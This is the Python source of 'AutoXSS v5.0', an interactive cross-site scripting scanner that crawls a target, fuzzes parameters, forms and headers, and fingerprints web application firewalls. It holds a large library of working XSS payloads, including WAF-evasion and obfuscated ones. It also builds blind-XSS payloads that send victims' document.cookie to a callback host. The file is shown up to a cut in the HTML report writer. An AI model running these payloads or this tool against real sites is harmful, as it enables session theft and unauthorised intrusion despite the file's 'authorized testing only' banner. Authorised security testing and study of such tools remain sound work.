#!/usr/bin/env python3
"""
╔══════════════════════════════════════════════════════════════════════════════╗
║   AutoXSS v5.0  ─  Interactive XSS Framework  ─  by R0b3rt0               ║
║   For authorized penetration testing & security education ONLY              ║
╚══════════════════════════════════════════════════════════════════════════════╝
"""

# ── auto-install deps ─────────────────────────────────────────────────────────
import subprocess, sys

def _pip(pkg, imp=None):
    try:
        return __import__(imp or pkg)
    except ImportError:
        subprocess.check_call([sys.executable,'-m','pip','install',pkg,'-q'],
                              stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        return __import__(imp or pkg)

requests  = _pip('requests')
_pip('beautifulsoup4','bs4')
_pip('colorama')
_pip('urllib3')

# ── stdlib ────────────────────────────────────────────────────────────────────
import os, re, time, json, random, string, threading, shutil
from datetime import datetime
from urllib.parse import urljoin, urlparse, parse_qs, urlunparse
from concurrent.futures import ThreadPoolExecutor, as_completed
from bs4 import BeautifulSoup
from colorama import init, Fore, Back, Style
init(autoreset=True)

try:
    import urllib3
    urllib3.disable_warnings()
except Exception:
    pass


# ╔══════════════════════════════════════════════════════════════════════════════╗
# ║                            TERMINAL THEME                                   ║
# ╚══════════════════════════════════════════════════════════════════════════════╝

TW = min(shutil.get_terminal_size((100,40)).columns, 100)

R_  = Fore.RED;    G_  = Fore.GREEN;  Y_  = Fore.YELLOW
C_  = Fore.CYAN;   M_  = Fore.MAGENTA; W_  = Fore.WHITE
DI  = Style.DIM;   BO  = Style.BRIGHT; RS  = Style.RESET_ALL

def r(col, txt): return f"{col}{txt}{RS}"
def bold(t):     return f"{BO}{t}{RS}"
def dim(t):      return f"{DI}{t}{RS}"

def _strip_ansi(s):
    return re.sub(r'\x1b\[[0-9;]*m','',s)

def ok(m):   print(r(G_,  f"  ✔  {m}"))
def warn(m): print(r(Y_,  f"  ⚠  {m}"))
def err(m):  print(r(R_,  f"  ✘  {m}"))
def info(m): print(r(C_,  f"  »  {m}"))
def vuln(m): print(r(R_,  bold(f"  ⚡ VULN ▶ {m}")))

def step(n, t):
    pad = TW - len(f"STEP {n}") - len(_strip_ansi(t)) - 14
    print(r(C_, f"\n┌─[ ") + r(Y_, bold(f"STEP {n}")) + r(C_," » ") +
          bold(t) + r(C_," ]") + r(C_, "─"*max(0, pad)))

def endsec():
    print(r(C_, "└" + "─"*(TW-1)))


# ╔══════════════════════════════════════════════════════════════════════════════╗
# ║                                BANNER                                       ║
# ╚══════════════════════════════════════════════════════════════════════════════╝

LOGO = r"""
  ██╗  ██╗███████╗███████╗    ███████╗ ██████╗ █████╗ ███╗   ██╗
  ╚██╗██╔╝██╔════╝██╔════╝    ██╔════╝██╔════╝██╔══██╗████╗  ██║
   ╚███╔╝ ███████╗███████╗    ███████╗██║     ███████║██╔██╗ ██║
   ██╔██╗ ╚════██║╚════██║    ╚════██║██║     ██╔══██║██║╚████║
  ██╔╝╚██╗███████║███████║    ███████║╚██████╗██║  ██║██║ ╚███║
  ╚═╝  ╚═╝╚══════╝╚══════╝    ╚══════╝ ╚═════╝╚═╝  ╚═╝╚═╝  ╚══╝
"""

def print_banner():
    os.system('cls' if os.name == 'nt' else 'clear')
    print(r(R_, LOGO))
    print(r(Y_, bold("      A U T O M A T E D   X S S   F R A M E W O R K   v 5 . 0")))
    print(r(DI, "  " + "─"*(TW-3)))
    print(r(C_, "  ► by ") + r(Y_, bold("R0b3rt0")) +
          r(DI, "  │  authorized testing only  │  educational use"))
    print(r(DI, "  " + "─"*(TW-3)))
    print()


# ╔══════════════════════════════════════════════════════════════════════════════╗
# ║                          INTERACTIVE WIZARD                                 ║
# ╚══════════════════════════════════════════════════════════════════════════════╝

def _prompt(label, default=None, validator=None, hint=''):
    dstr = f" [{dim(str(default))}]" if default is not None and default != '' else ''
    hstr = f"\n  {dim('  ↳ ' + hint)}" if hint else ''
    if hstr: print(hstr)
    while True:
        try:
            val = input(r(C_, "  ╠══▶ ") + r(Y_, label) + dstr + r(C_, " : ")).strip()
        except (EOFError, KeyboardInterrupt):
            print(); raise
        if not val and default is not None:
            return default
        if val and (validator is None or validator(val)):
            return val
        if not val and default is None:
            print(r(R_, "  ✘  This field is required."))

def _choose(label, options, default=0):
    print(r(C_, f"\n  ╠══ {bold(label)}"))
    for i, (k, v) in enumerate(options):
        marker = r(Y_, bold("▶")) if i == default else r(DI, " ")
        num    = r(Y_, f"[{i+1}]")
        print(f"  ║   {marker} {num}  {r(W_, k):<22}{dim(v)}")
    while True:
        try:
            raw = input(r(C_, f"  ╠══▶ Choice") + f" [{dim(str(default+1))}] : ").strip()
        except (EOFError, KeyboardInterrupt):
            print(); raise
        if not raw:
            return options[default][0]
        if raw.isdigit() and 1 <= int(raw) <= len(options):
            return options[int(raw)-1][0]
        print(r(R_, f"  ✘  Pick 1–{len(options)}"))

def _yn(label, default=True):
    dflt = 'Y/n' if default else 'y/N'
    try:
        raw = input(r(C_, "  ╠══▶ ") + r(Y_, label) +
                    f" [{dim(dflt)}] : ").strip().lower()
    except (EOFError, KeyboardInterrupt):
        print(); raise
    return default if not raw else raw in ('y', 'yes')

def _sec(title, icon=''):
    print()
    inner = f"  {icon}  {bold(title)}  "
    pad   = TW - len(_strip_ansi(inner)) - 4
    print(r(C_, f"  ╔══[") + r(Y_, inner) + r(C_, "]" + "═"*max(0,pad) + "╗"))

def _div():
    print(r(C_, "  ╠" + "─"*(TW-4) + "╣"))


def wizard():
    """Full guided wizard — returns cfg dict."""
    print_banner()

    print(r(Y_, bold("  ════════════════════════════════════════════════")))
    print(r(Y_, bold("     WELCOME TO AUTOXSS INTERACTIVE WIZARD  🔥")))
    print(r(Y_, bold("  ════════════════════════════════════════════════")))
    print()
    print(r(C_, "  Just answer the prompts. Press ") + r(Y_, "ENTER") +
          r(C_, " to accept") + dim(" [defaults]") + r(C_, "."))
    print(r(C_, "  Leave optional fields blank to skip them."))
    print()

    cfg = {}

    # ── 1. Target URL ─────────────────────────────────────────────────────────
    _sec("TARGET URL", "🎯")
    print(r(DI, "  ║  Full URL of your target. Include ?param=value if you know it."))
    print(r(DI, "  ║  e.g.  https://testsite.com/search?q=hello"))
    print(r(DI, "  ║        https://testsite.com/login"))
    print(r(DI, "  ║        http://192.168.1.10/app/"))
    _div()

    def valid_url(u):
        if not u.startswith(('http://', 'https://')):
            print(r(R_, "  ✘  Must start with http:// or https://"))
            return False
        return True

    cfg['url'] = _prompt("Target URL", validator=valid_url)

    # ── 2. Specific endpoint ──────────────────────────────────────────────────
    _sec("SPECIFIC ENDPOINT  (optional)", "📍")
    print(r(DI, "  ║  Already know the EXACT URL with the input? Enter it here."))
    print(r(DI, "  ║  e.g. https://site.com/search   or   https://site.com/app?s="))
    print(r(DI, "  ║  Leave BLANK → crawler will discover endpoints automatically."))
    _div()
    ep = _prompt("Specific endpoint", default="")
    cfg['endpoint'] = ep or None

    # ── 3. Known parameter ────────────────────────────────────────────────────
    _sec("KNOWN PARAMETER  (optional)", "🔑")
    print(r(DI, "  ║  Know the exact input/param name? (e.g.  q, search, id, input)"))
    print(r(DI, "  ║  The scanner will jump straight to fuzzing it."))
    print(r(DI, "  ║  Leave BLANK → full auto-discovery."))
    _div()
    kp = _prompt("Parameter name", default="")
    cfg['known_param'] = kp or None

    # ── 4. Scan mode ──────────────────────────────────────────────────────────
    _sec("SCAN MODE", "⚙️")
    mode = _choose("Select scan intensity", [
        ("quick",    "Fast — top payloads, URL params only (~1 min)"),
        ("standard", "Standard — crawl + forms + headers  [recommended]"),
        ("deep",     "Deep — full crawl, all vectors, DOM analysis"),
        ("stealth",  "Stealth — slow requests, low noise, WAF evasion"),
        ("targeted", "Targeted — only hit the exact param/endpoint you gave"),
    ], default=1)
    cfg['mode']    = mode
    cfg['depth']   = {'quick':1,'standard':2,'deep':3,'stealth':2,'targeted':1}[mode]
    cfg['threads'] = {'quick':8,'standard':5,'deep':4,'stealth':1,'targeted':3}[mode]
    cfg['delay']   = {'quick':0,'standard':0,'deep':0,'stealth':2.0,'targeted':0}[mode]

    # ── 5. Payload profile ────────────────────────────────────────────────────
    _sec("PAYLOAD PROFILE", "💉")
    profile = _choose("Which payload set?", [
        ("all",        "Everything combined — largest set, most thorough"),
        ("waf_bypass", "WAF Bypass — encoded/obfuscated evasion payloads"),
        ("polyglot",   "Polyglot — multi-context, breaks many parsers"),
        ("dom",        "DOM-based — hash/source XSS vectors"),
        ("blind",      "Blind XSS — out-of-band (needs callback URL)"),
        ("quick",      "Quick check — ~10 classic payloads only"),
    ], default=0)
    cfg['payload_profile'] = profile

    # ── 6. Blind XSS ─────────────────────────────────────────────────────────
    _sec("BLIND XSS CALLBACK  (optional)", "🕳️")
    print(r(DI, "  ║  For blind/stored XSS — payloads will beacon to YOUR server."))
    print(r(DI, "  ║  Works with XSS Hunter, interactsh, Burp Collaborator, etc."))
    print(r(DI, "  ║  Leave BLANK to skip blind XSS payloads."))
    _div()
    bx = _prompt("Callback URL", default="")
    cfg['blind_callback'] = bx or None

    # ── 7. Auth ───────────────────────────────────────────────────────────────
    _sec("AUTHENTICATION", "🔐")
    if _yn("Does target need cookies / custom headers?", False):
        _div()
        print(r(DI, "  ║  Cookie format:  session=abc123; csrf=xyz"))
        cfg['cookies'] = _prompt("Cookie string", default="") or None
        _div()
        print(r(DI, "  ║  Custom headers — one per line e.g.  Authorization: Bearer TOKEN"))
        print(r(DI, "  ║  Press ENTER on empty line when done."))
        lines = []
        while True:
            try:
                l = input(r(C_, "  ║  ▶ ")).strip()
            except (EOFError, KeyboardInterrupt):
                break
            if not l:
                break
            lines.append(l)
        cfg['headers'] = '\n'.join(lines) or None
    else:
        cfg['cookies'] = None
        cfg['headers'] = None

    # ── 8. Proxy ──────────────────────────────────────────────────────────────
    _sec("PROXY  (optional)", "🔄")
    print(r(DI, "  ║  Route traffic through Burp Suite / ZAP / mitmproxy"))
    print(r(DI, "  ║  e.g.  http://127.0.0.1:8080"))
    _div()
    px = _prompt("Proxy URL", default="")
    cfg['proxy'] = px or None

    # ── 9. Extra toggles ──────────────────────────────────────────────────────
    _sec("EXTRA OPTIONS", "🛠️")
    cfg['skip_headers'] = not _yn("Test HTTP header injection (Referer, X-Forwarded-For…)?", True)
    cfg['test_dom']     = _yn("Run DOM sink analysis?", True)
    cfg['verbose']      = _yn("Verbose output (show all reflections & misses)?", False)
    cfg['save_html']    = _yn("Save HTML report after scan?", True)
    cfg['save_json']    = _yn("Save JSON report after scan?", True)

    # ── 10. Confirm ───────────────────────────────────────────────────────────
    _sec("CONFIRM & LAUNCH", "🚀")
    rows = [
        ("Target",          cfg['url']),
        ("Endpoint",        cfg['endpoint'] or "auto-discover"),
        ("Known param",     cfg['known_param'] or "auto-discover"),
        ("Mode",            mode.upper()),
        ("Payload profile", profile.upper()),
        ("Crawl depth",     str(cfg['depth'])),
        ("Threads",         str(cfg['threads'])),
        ("Delay",           f"{cfg['delay']}s"),
        ("Proxy",           cfg['proxy'] or "none"),
        ("Blind callback",  cfg['blind_callback'] or "none"),
        ("Auth cookies",    "yes" if cfg['cookies'] else "no"),
    ]
    for label, val in rows:
        print(r(C_, f"  ║  {label:<18}: ") + r(Y_, val))
    _div()

    if not _yn("Everything look good? Launch scan now?", True):
        print(r(Y_, "\n  Scan cancelled — run again to reconfigure."))
        sys.exit(0)

    return cfg


# ╔══════════════════════════════════════════════════════════════════════════════╗
# ║                           PAYLOAD LIBRARY                                   ║
# ╚══════════════════════════════════════════════════════════════════════════════╝

PAYLOADS = {
    'html': [
        '<script>alert(1)</script>',
        '<script>alert("XSS")</script>',
        '<ScRiPt>alert(1)</ScRiPt>',
        '"><script>alert(1)</script>',
        "'><script>alert(1)</script>",
        '</title><script>alert(1)</script>',
        '</textarea><script>alert(1)</script>',
        '</style><script>alert(1)</script>',
        '</noscript><script>alert(1)</script>',
    ],
    'img': [
        '<img src=x onerror=alert(1)>',
        '<img src=x onerror=alert`1`>',
        '<img/src=x onerror=alert(1)>',
        '<img src="x" onerror="eval(atob(\'YWxlcnQoMSk=\'))">',
        '"><img src=x onerror=alert(1)>',
        "<img src=1 href=1 onerror=\"javascript:alert(1)\"></img>",
    ],
    'svg': [
        '<svg onload=alert(1)>',
        '<svg/onload=alert(1)>',
        '"><svg onload=alert(1)>',
        '<svg><script>alert(1)</script></svg>',
        '<svg><animate onbegin=alert(1)>',
        "<svg><desc><![CDATA[</desc><script>alert(1)</script>]]></svg>",
    ],
    'attribute': [
        '" onmouseover="alert(1)',
        "' onmouseover='alert(1)",
        '" onfocus="alert(1)" autofocus="',
        '" onload="alert(1)',
        "' onclick='alert(1)",
        '" onpointerover="alert(1)',
        '<input autofocus onfocus=alert(1)>',
        '<details open ontoggle=alert(1)>',
        '<video><source onerror="alert(1)">',
        '<select autofocus onfocus=alert(1)>',
        '<textarea autofocus onfocus=alert(1)>',
    ],
    'js_context': [
        'alert(1)',
        '";alert(1)//',
        "';alert(1)//",
        '`${alert(1)}`',
        ')-alert(1)-(',
        '"-alert(1)-"',
        ');alert(1)//',
        '\\";alert(1)//',
    ],
    'url': [
        'javascript:alert(1)',
        'javascript:alert`1`',
        'JaVaScRiPt:alert(1)',
        'data:text/html,<script>alert(1)</script>',
        'java\tscript:alert(1)',
        'java\nscript:alert(1)',
    ],
    'filter_bypass': [
        '<scr<script>ipt>alert(1)</scr</script>ipt>',
        '<<SCRIPT>alert("XSS");//<</SCRIPT>',
        '\x3cscript\x3ealert(1)\x3c/script\x3e',
        '<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;alert(1)>',
        '¼script¾alert(¢xss¢)¼/script¾',
    ],
    'waf_bypass': [
        '<svg/onload=&#97&#108&#101&#114&#116(1)>',
        '<img src=x:alert(alt) onerror=eval(src) alt=1>',
        '<svg><script>alert&#40;1&#41;</script>',
        '"><img src=x onerror=confirm`1`>',
        '<details open ontoggle=alert(1)>',
        '<select autofocus onfocus=alert(1)>',
        '<textarea autofocus onfocus=alert(1)>',
        '<keygen autofocus onfocus=alert(1)>',
    ],
    'polyglot': [
        "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>>",
        "'''><script>alert(1);</script>",
        '0\"autofocus/onfocus=alert(1)--><video/src><source/onerror=alert(2)></video>',
        '">><marquee><img src=x onerror=confirm(1)></marquee>',
    ],
    'dom': [
        '#<script>alert(1)</script>',
        '#"><img src=x onerror=alert(1)>',
        '#<svg onload=alert(1)>',
        '?next=javascript:alert(1)',
        '?redirect=javascript:alert(1)',
        '?url=data:text/html,<script>alert(1)</script>',
    ],
    'mutation': [
        '<noscript><p title="</noscript><img src=x onerror=alert(1)>">',
        '<svg><style><img src=x onerror=alert(1)></style></svg>',
        '<math><mi//xlink:href="data:x,<script>alert(1)</script>">',
        '<table><td background="javascript:alert(1)">',
    ],
    'blind':  [],  # populated dynamically
    'quick': [
        '<script>alert(1)</script>',
        '<img src=x onerror=alert(1)>',
        '<svg onload=alert(1)>',
        '" onmouseover="alert(1)',
        "javascript:alert(1)",
        '"><script>alert(1)</script>',
        '<details open ontoggle=alert(1)>',
        "'><img src=x onerror=alert(1)>",
        '<svg/onload=alert(1)>',
        '";alert(1)//',
    ],
}

PROFILE_CATS = {
    'all':        list(PAYLOADS.keys()),
    'waf_bypass': ['waf_bypass','filter_bypass','polyglot','mutation'],
    'polyglot':   ['polyglot','filter_bypass','waf_bypass'],
    'dom':        ['dom','js_context'],
    'blind':      ['blind','html','svg','img'],
    'quick':      ['quick'],
}

CONTEXT_MAP = {
    'html':               ['html','img','svg','filter_bypass','waf_bypass','polyglot'],
    'attribute_quoted':   ['attribute','waf_bypass'],
    'attribute_unquoted': ['attribute','html','svg'],
    'script':             ['js_context'],
    'url':                ['url','js_context'],
    'none':               ['html','img','svg','filter_bypass','waf_bypass','polyglot'],
}


def build_payloads(profile, base_dir, blind_callback=None):
    if blind_callback:
        cb = blind_callback.rstrip('/')
        PAYLOADS['blind'] = [
            f'<script src="{cb}"></script>',
            f'"><script src="{cb}"></script>',
            f"';new Image().src='{cb}?c='+document.cookie//",
            f'<img src=x onerror="new Image().src=\'{cb}?c=\'+document.cookie">',
            f'<svg onload="fetch(\'{cb}?c=\'+btoa(document.cookie))">',
        ]

    cats = PROFILE_CATS.get(profile, PROFILE_CATS['all'])
    pool = []
    for cat in cats:
        pool.extend(PAYLOADS.get(cat, []))

    # Load from payloads/ directory
    pd = os.path.join(base_dir, 'payloads')
    if os.path.isdir(pd):
        for fn in os.listdir(pd):
            if fn.endswith('.txt'):
                try:
                    with open(os.path.join(pd, fn), errors='ignore') as f:
                        pool.extend(l.strip() for l in f if l.strip())
                except Exception:
                    pass

    return list(dict.fromkeys(pool))


# ╔══════════════════════════════════════════════════════════════════════════════╗
# ║                              HTTP CLIENT                                    ║
# ╚══════════════════════════════════════════════════════════════════════════════╝

class Client:
    UA = ('Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 '
          '(KHTML, like Gecko) Chrome/124.0 Safari/537.36')

    def __init__(self, cfg):
        self.s = requests.Session()
        self.s.verify = False
        self.s.headers.update({'User-Agent': self.UA,
                               'Accept': 'text/html,*/*;q=0.8',
                               'Accept-Language': 'en-US,en;q=0.5'})
        if cfg.get('cookies'):
            for part in cfg['cookies'].split(';'):
                if '=' in part:
                    k, _, v = part.strip().partition('=')
                    self.s.cookies.set(k.strip(), v.strip())
        if cfg.get('headers'):
            for line in cfg['headers'].splitlines():
                if ':' in line:
                    k, _, v = line.partition(':')
                    self.s.headers[k.strip()] = v.strip()
        if cfg.get('proxy'):
            self.s.proxies = {'http': cfg['proxy'], 'https': cfg['proxy']}
        self.delay   = cfg.get('delay', 0)
        self.timeout = cfg.get('timeout', 10)

    def get(self, url, **kw):
        time.sleep(self.delay)
        try:
            return self.s.get(url, timeout=self.timeout, allow_redirects=True, **kw)
        except Exception:
            return None

    def post(self, url, data=None, **kw):
        time.sleep(self.delay)
        try:
            return self.s.post(url, data=data, timeout=self.timeout,
                               allow_redirects=True, **kw)
        except Exception:
            return None


# ╔══════════════════════════════════════════════════════════════════════════════╗
# ║                               CRAWLER                                       ║
# ╚══════════════════════════════════════════════════════════════════════════════╝

class Crawler:
    def __init__(self, client, base, depth=2):
        self.c      = client
        self.base   = base
        self.origin = urlparse(base).netloc
        self.depth  = depth
        self.visited = set()
        self.urls    = set()
        self.forms   = []
        self._lk     = threading.Lock()

    def crawl(self):
        self._visit(self.base, 0)
        return list(self.urls), self.forms

    def _visit(self, url, d):
        if d > self.depth or url in self.visited:
            return
        with self._lk:
            if url in self.visited:
                return
            self.visited.add(url)
        resp = self.c.get(url)
        if not resp or 'html' not in resp.headers.get('Content-Type', ''):
            return
        soup = BeautifulSoup(resp.text, 'html.parser')
        for form in soup.find_all('form'):
            f = self._parse_form(form, url)
            if f:
                with self._lk:
                    self.forms.append(f)
        for tag in soup.find_all('a', href=True):
            full   = urljoin(url, tag['href'])
            parsed = urlparse(full)
            if parsed.netloc != self.origin:
                continue
            clean = urlunparse(parsed._replace(fragment=''))
            with self._lk:
                self.urls.add(clean)
            self._visit(clean, d + 1)

    def _parse_form(self, form, page):
        action = urljoin(page, form.get('action') or page)
        method = form.get('method', 'GET').upper()
        inputs = []
        for tag in form.find_all(['input', 'textarea', 'select']):
            name = tag.get('name')
            if not name:
                continue
            typ = tag.get('type', 'text').lower()
            if typ in ('submit', 'button', 'image', 'reset'):
                continue
            inputs.append({'name': name, 'type': typ, 'value': tag.get('value', '')})
        if not inputs:
            return None
        return {'action': action, 'method': method, 'inputs': inputs, 'page': page}


# ╔══════════════════════════════════════════════════════════════════════════════╗
# ║                         REFLECTION ANALYZER                                 ║
# ╚══════════════════════════════════════════════════════════════════════════════╝

class Reflector:
    PFX = 'R0b3rt0'

    def __init__(self, client):
        self.c = client

    def probe(self, url, param, method='GET', base=None):
        uid  = self.PFX + ''.join(random.choices(string.ascii_lowercase, k=6))
        data = dict(base or {})
        data[param] = uid
        resp = (self.c.post(url, data=data) if method == 'POST'
                else self.c.get(url, params=data))
        if not resp or uid not in resp.text:
            return None, None
        return uid, self._ctx(resp.text, uid)

    def _ctx(self, body, probe):
        idx = body.find(probe)
        if idx == -1:
            return 'none'
        before = body[max(0, idx-120):idx]
        chunk  = before + probe + body[idx+len(probe):idx+len(probe)+120]
        if re.search(r'<script[^>]*>[^<]*' + re.escape(probe), chunk, re.I | re.S):
            return 'script'
        if re.search(r'href=["\']?[^"\']*' + re.escape(probe), chunk, re.I):
            return 'url'
        if re.search(r'<[^>]*' + re.escape(probe), chunk):
            last = before.split('<')[-1]
            return 'attribute_quoted' if ('"' in last or "'" in last) else 'attribute_unquoted'
        return 'html'


# ╔══════════════════════════════════════════════════════════════════════════════╗
# ║                              XSS ENGINE                                     ║
# ╚══════════════════════════════════════════════════════════════════════════════╝

SUCCESS_RE = [
    re.compile(r'<script[^>]*>alert',         re.I),
    re.compile(r'onerror\s*=\s*alert',        re.I),
    re.compile(r'onload\s*=\s*alert',         re.I),
    re.compile(r'javascript:alert',           re.I),
    re.compile(r'<svg[^>]*onload',            re.I),
    re.compile(r'<img[^>]*onerror',           re.I),
    re.compile(r'onfocus\s*=\s*alert',        re.I),
    re.compile(r'<details[^>]*ontoggle',      re.I),
    re.compile(r'onmouseover\s*=\s*alert',    re.I),
]

DANGER_WORDS = [
    'onerror','onload','onfocus','onmouseover','ontoggle',
    '<script','javascript:','svg/onload','onpointerover','confirm`',
]

def is_vulnerable(payload, body):
    if payload not in body:
        return False
    pl_low = payload.lower()
    b_low  = body.lower()
    for pat in SUCCESS_RE:
        if pat.search(body):
            return True
    return any(d in pl_low and d in b_low for d in DANGER_WORDS)


class Engine:
    INJECTABLE_HEADERS = [
        'X-Forwarded-For', 'X-Real-IP', 'Referer',
        'X-Custom-IP', 'X-Originating-IP', 'X-Remote-IP',
        'X-Client-IP', 'True-Client-IP', 'CF-Connecting-IP',
    ]
    DOM_SINKS   = ['document.write','innerHTML','outerHTML','eval(',
                   'setTimeout(','setInterval(','location.hash']
    DOM_SOURCES = ['location.hash','location.search','location.href',
                   'document.referrer','window.name']

    def __init__(self, client, payloads, verbose=False):
        self.c        = client
        self.pl       = payloads
        self.vb       = verbose
        self.ref      = Reflector(client)
        self.findings = []
        self._lk      = threading.Lock()

    def _register(self, f):
        with self._lk:
            self.findings.append(f)
        vuln(f"{f['type']}  |  {f['vector']}  |  {f['payload'][:70]}")

    def _fuzz(self, url, param, method, base):
        found = []
        for pl in self.pl:
            d = dict(base)
            d[param] = pl
            resp = (self.c.post(url, data=d) if method == 'POST'
                    else self.c.get(url, params=d))
            if resp and is_vulnerable(pl, resp.text):
                f = {
                    'type': 'Reflected XSS',
                    'url': url,
                    'vector': f'{method} param [{param}]',
                    'payload': pl,
                    'severity': 'HIGH',
                    'status': resp.status_code,
                }
                self._register(f)
                found.append(f)
                break  # one confirmed hit per param is enough
        return found

    def test_url_params(self, url):
        params = parse_qs(urlparse(url).query, keep_blank_values=True)
        if not params:
            return []
        results = []
        for param in params:
            _, ctx = self.ref.probe(url, param)
            if not ctx:
                if self.vb:
                    info(f"Param [{param}] → not reflected")
                continue
            ok(f"Param [{r(Y_,param)}] reflected → context: {r(Y_,ctx)}")
            results.extend(self._fuzz(url, param, 'GET', {}))
        return results

    def test_form(self, form):
        action  = form['action']
        method  = form['method']
        base    = {i['name']: i['value'] for i in form['inputs']}
        results = []
        for inp in form['inputs']:
            name = inp['name']
            _, ctx = self.ref.probe(action, name, method, base)
            if not ctx:
                if self.vb:
                    info(f"  [{name}] not reflected")
                continue
            ok(f"  Field [{r(Y_,name)}] reflected → context: {r(Y_,ctx)}")
            results.extend(self._fuzz(action, name, method, base))
        return results

    def test_known_param(self, url, param, method='GET'):
        info(f"Direct fuzzing known param [{r(Y_,param)}] on {url}")
        _, ctx = self.ref.probe(url, param, method)
        if ctx:
            ok(f"Param [{r(Y_,param)}] reflected → context: {r(Y_,ctx)}")
        else:
            warn(f"Probe not reflected — fuzzing anyway with all payloads")
        return self._fuzz(url, param, method, {})

    def test_headers(self, url):
        results  = []
        quick_pl = PAYLOADS['quick'][:5] + PAYLOADS.get('svg', [])[:3]
        for hdr in self.INJECTABLE_HEADERS:
            for pl in quick_pl:
                resp = self.c.get(url, headers={hdr: pl})
                if resp and is_vulnerable(pl, resp.text):
                    f = {
                        'type': 'Reflected XSS (Header)',
                        'url': url,
                        'vector': f'Header: {hdr}',
                        'payload': pl,
                        'severity': 'HIGH',
                    }
                    self._register(f)
                    results.append(f)
        return results

    def test_dom(self, url):
        resp = self.c.get(url)
        if not resp:
            return []
        sinks   = [s for s in self.DOM_SINKS   if s in resp.text]
        sources = [s for s in self.DOM_SOURCES if s in resp.text]
        if sinks and sources:
            f = {
                'type': 'DOM XSS Risk',
                'url': url,
                'vector': 'JavaScript source → sink',
                'severity': 'MEDIUM',
                'payload': f"sinks={sinks[:3]}  sources={sources[:2]}",
            }
            with self._lk:
                self.findings.append(f)
            warn(f"DOM risk → manual verification needed  sinks={sinks[:2]}")
            return [f]
        return []


# ╔══════════════════════════════════════════════════════════════════════════════╗
# ║                             WAF DETECTOR                                    ║
# ╚══════════════════════════════════════════════════════════════════════════════╝

WAF_SIGS = {
    'Cloudflare':  ['cloudflare', 'cf-ray', '__cfduid'],
    'ModSecurity': ['mod_security', 'modsecurity'],
    'AWS WAF':     ['awswaf', 'aws-waf'],
    'Akamai':      ['akamai', 'ak_bmsc'],
    'Imperva':     ['incapsula', 'visid_incap'],
    'Sucuri':      ['sucuri'],
    'Barracuda':   ['barra_counter_session'],
    'F5 BIG-IP':   ['bigip'],
    'Wordfence':   ['wordfence'],
}

def detect_waf(client, url):
    resp = client.get(url)
    if not resp:
        return None
    blob = (str(resp.headers) + str(resp.cookies) + resp.text[:2000]).lower()
    for name, sigs in WAF_SIGS.items():
        if any(s in blob for s in sigs):
            return name
    probe = client.get(url, params={'xss': '<script>alert(1)</script>'})
    if probe and probe.status_code in (403, 406, 501):
        return f"Unknown WAF (HTTP {probe.status_code})"
    return None


# ╔══════════════════════════════════════════════════════════════════════════════╗
# ║                           PROGRESS / SPINNER                                ║
# ╚══════════════════════════════════════════════════════════════════════════════╝

class Progress:
    def __init__(self, total, label=''):
        self.total = max(total, 1)
        self.done  = 0
        self.label = label
        self._lk   = threading.Lock()

    def tick(self):
        with self._lk:
            self.done = min(self.done + 1, self.total)
            pct    = self.done / self.total
            bar_w  = 38
            filled = int(bar_w * pct)
            bar    = r(G_, '█' * filled) + r(DI, '░' * (bar_w - filled))
            sys.stdout.write(
                f"\r  {r(C_,'[')} {bar} {r(C_,']')} "
                f"{r(Y_, f'{int(pct*100):3d}%')} "
                f"{r(DI, f'{self.done}/{self.total}')} {self.label}   ")
            sys.stdout.flush()
            if self.done >= self.total:
                sys.stdout.write('\n')


def spinner(msg):
    frames = '⠋⠙⠹⠸⠼⠴⠦⠧⠇⠏'
    stop   = threading.Event()

    def _run():
        i = 0
        while not stop.is_set():
            sys.stdout.write(f"\r  {r(Y_, frames[i % len(frames)])}  {msg}   ")
            sys.stdout.flush()
            time.sleep(0.07)
            i += 1
        sys.stdout.write(f"\r  {r(G_, '✔')}  {msg} — done{' '*10}\n")
        sys.stdout.flush()

    t = threading.Thread(target=_run, daemon=True)
    t.start()
    return stop, t


# ╔══════════════════════════════════════════════════════════════════════════════╗
# ║                               REPORTER                                      ║
# ╚══════════════════════════════════════════════════════════════════════════════╝

def print_report(findings, target, elapsed):
    print()
    print(r(R_, '█' * TW))
    title = f"  ⚡  AutoXSS v5.0  ─  FINAL REPORT  ─  R0b3rt0"
    print(r(R_, '█') + r(Y_, bold(f"{title:^{TW-2}}")) + r(R_, '█'))
    print(r(R_, '█' * TW))
    print()
    info(f"Target  : {r(Y_, target)}")
    info(f"Elapsed : {elapsed:.1f}s   |   {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    print()

    highs   = [f for f in findings if 'HIGH'   in f.get('severity', '')]
    mediums = [f for f in findings if 'MEDIUM' in f.get('severity', '')]

    if not findings:
        print(r(G_, bold("  ✅  No XSS vulnerabilities detected.")))
    else:
        print(r(R_, bold(f"  🔥  TOTAL FINDINGS : {len(findings)}")))
        print(r(R_,       f"  ▸  HIGH   : {len(highs)}"))
        print(r(Y_,       f"  ▸  MEDIUM : {len(mediums)}"))
        print()
        print(r(C_, '  ' + '─' * (TW - 4)))
        for i, f in enumerate(findings, 1):
            col = R_ if 'HIGH' in f.get('severity', '') else Y_
            print(r(col, f"\n  [{i}] {bold(f['type'])}  »  {f['severity']}"))
            print(r(C_,  f"       URL     : {f['url']}"))
            print(r(C_,  f"       Vector  : {f['vector']}"))
            print(r(C_,  f"       Payload : ") + r(Y_, f['payload'][:80]))
        print()
        print(r(C_, '  ' + '─' * (TW - 4)))


def save_json(findings, target):
    ts = datetime.now().strftime('%Y%m%d_%H%M%S')
    fn = f"xss_report_{ts}.json"
    with open(fn, 'w') as f:
        json.dump({
            'tool': 'AutoXSS v5.0', 'author': 'R0b3rt0',
            'target': target, 'timestamp': datetime.now().isoformat(),
            'total': len(findings), 'findings': findings,
        }, f, indent=2)
    return fn


def save_html(findings, target):
    ts = datetime.now().strftime('%Y%m%d_%H%M%S')
    fn = f"xss_report_{ts}.html"
    rows = ''.join(f"""<tr>
        <td style="color:{'#ff4444' if 'HIGH' in f.get('severity','') else '#ffaa00'}">{f['type']}</td>
        <td class="url">{f['url']}</td>
        <td>{f['vector']}</td>
        <td><code>{f['payload'][:90]}</code></td>
        <td style="color:{'#ff4444' if 'HIGH' in f.get('severity','') else '#ffaa00'}">{f['severity']}</td>
